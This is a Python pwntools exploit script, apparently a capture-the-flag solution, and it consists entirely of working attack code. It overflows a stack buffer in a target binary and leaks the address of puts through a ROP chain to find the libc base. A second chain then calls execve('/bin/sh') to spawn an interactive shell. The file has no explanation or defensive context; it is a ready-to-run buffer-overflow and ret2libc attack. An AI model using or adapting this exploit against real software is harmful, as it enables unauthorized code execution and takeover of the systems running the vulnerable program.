import sys
from pwn import *


def exploit(io, fname):
    context.arch = "amd64"

    with open(fname, "rb") as f:
        bin = f.read()
        i = bin.index(b"\x48\x81\xec") + 3  # sub rsp, sz
        sz = int.from_bytes(bin[i : i + 4], byteorder="little")
        print(hex(sz))

    elf = ELF(fname)
    rop = ROP(elf)

    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    puts_plt = elf.plt["puts"]
    main = elf.sym["main"]

    io.sendline(b"a" * (sz + 8) + flat([pop_rdi, elf.got["puts"], puts_plt, main]))
    io.recvuntil(b"Thanks!\n")
    puts = int.from_bytes(io.recv(6), byteorder="little")
    libc_base = puts - 0x071910
    print(hex(libc_base))

    libc = ELF("./libc6_2.28-10_amd64.so")
    libc.address = libc_base
    binsh = next(libc.search(b"/bin/sh"))
    libc_rop = ROP(libc)
    libc_rop.call("execve", [binsh, 0, 0])
    print(libc_rop.dump())
    chain = libc_rop.chain()
    io.sendline(b"a" * (sz + 8) + chain)
    io.interactive()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        exit(1)
    io = process(sys.argv[1])
    exploit(io, sys.argv[1])
